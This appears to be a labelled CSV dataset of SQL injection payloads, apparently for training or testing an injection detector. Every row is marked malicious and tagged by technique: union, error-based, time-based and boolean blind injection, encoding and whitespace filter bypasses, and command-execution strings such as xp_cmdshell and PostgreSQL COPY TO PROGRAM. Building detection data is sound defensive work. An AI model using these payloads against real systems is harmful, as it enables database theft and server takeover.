Sentence,Label,Source,Type
"/*!50000UNION*//*!50000SELECT*/1,2,3--",1,CVE_ExploitDB,union_versioned_comment
"/*!UNION*//*!SELECT*/NULL,NULL--",1,CVE_ExploitDB,union_versioned_comment
1/*!UNION/*!ALL*/SELECT*/NULL--,1,CVE_ExploitDB,union_versioned_comment
"1+/*!UNION*/+/*!SELECT*/+NULL,NULL--",1,CVE_ExploitDB,union_versioned_comment
"1/**/UNION/**/SELECT/**/1,2,3--",1,CVE_ExploitDB,union_comment_bypass
"' UNION SELECT 0x61646d696e,0x61646d696e--",1,CVE_ExploitDB,union_hex
1 AND 0x61=0x61,1,CVE_ExploitDB,boolean_hex
' OR 0x313d31--,1,CVE_ExploitDB,boolean_hex
CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',1,CVE_ExploitDB,char_encoding
"' UNION SELECT CHAR(65,68,77,73,78),NULL--",1,CVE_ExploitDB,union_char
'; EXEC xp_cmdshell('whoami')--,1,CVE_ExploitDB,mssql_rce
1; WAITFOR DELAY '0:0:5'--,1,CVE_ExploitDB,mssql_timebased
'; WAITFOR DELAY '00:00:05'--,1,CVE_ExploitDB,mssql_timebased
"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,CVE_ExploitDB,mssql_error
'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,1,CVE_ExploitDB,mssql_dynamic
1;SELECT TOP 1 table_name FROM information_schema.tables--,1,CVE_ExploitDB,mssql_enum
"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",1,CVE_ExploitDB,mssql_union
' UNION SELECT NULL FROM dual--,1,CVE_ExploitDB,oracle_union
' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,1,CVE_ExploitDB,oracle_oob
1 AND ROWNUM=1 AND 1=1--,1,CVE_ExploitDB,oracle_boolean
"' UNION SELECT NULL,NULL FROM dual--",1,CVE_ExploitDB,oracle_union
' AND 1=(SELECT COUNT(*) FROM all_tables)--,1,CVE_ExploitDB,oracle_enum
'; SELECT PG_SLEEP(5)--,1,CVE_ExploitDB,pgsql_timebased
"' UNION SELECT NULL::text,NULL::text--",1,CVE_ExploitDB,pgsql_union
1;SELECT version()--,1,CVE_ExploitDB,pgsql_enum
' AND 1=(SELECT COUNT(*) FROM pg_tables)--,1,CVE_ExploitDB,pgsql_enum
'; COPY (SELECT '') TO PROGRAM 'id'--,1,CVE_ExploitDB,pgsql_rce
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,CVE_ExploitDB,error_extractvalue
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",1,CVE_ExploitDB,error_updatexml
"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,CVE_ExploitDB,error_floor_rand
"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",1,CVE_ExploitDB,error_gtid
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",1,CVE_ExploitDB,error_json
1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,1,CVE_ExploitDB,error_geometry
' AND EXP(~(SELECT * FROM (SELECT user())x))--,1,CVE_ExploitDB,error_exp
' AND SLEEP(5) AND '1'='1,1,CVE_ExploitDB,timebased_sleep
1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,1,CVE_ExploitDB,timebased_subquery
"' AND IF(1=1,SLEEP(5),0)--",1,CVE_ExploitDB,timebased_if
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,1,CVE_ExploitDB,timebased_if_mssql
1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,1,CVE_ExploitDB,timebased_nested
"' AND SUBSTRING(username,1,1)='a' AND '1'='1",1,CVE_ExploitDB,boolean_substring
"' AND ASCII(SUBSTR(username,1,1))>64--",1,CVE_ExploitDB,boolean_ascii
1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,1,CVE_ExploitDB,boolean_count
"' AND MID(version(),1,1)='5'--",1,CVE_ExploitDB,boolean_mid
"' AND BINARY SUBSTRING(password,1,1)='a'--",1,CVE_ExploitDB,boolean_binary
'		OR		1=1--,1,CVE_ExploitDB,whitespace_tab
"'
OR
1=1--",1,CVE_ExploitDB,whitespace_crlf
' OR/**/1=1--,1,CVE_ExploitDB,whitespace_comment
'/**/OR/**/1/**/=/**/1--,1,CVE_ExploitDB,whitespace_comment_heavy
"1%09UNION%09SELECT%091,2,3--",1,CVE_ExploitDB,tab_encoded
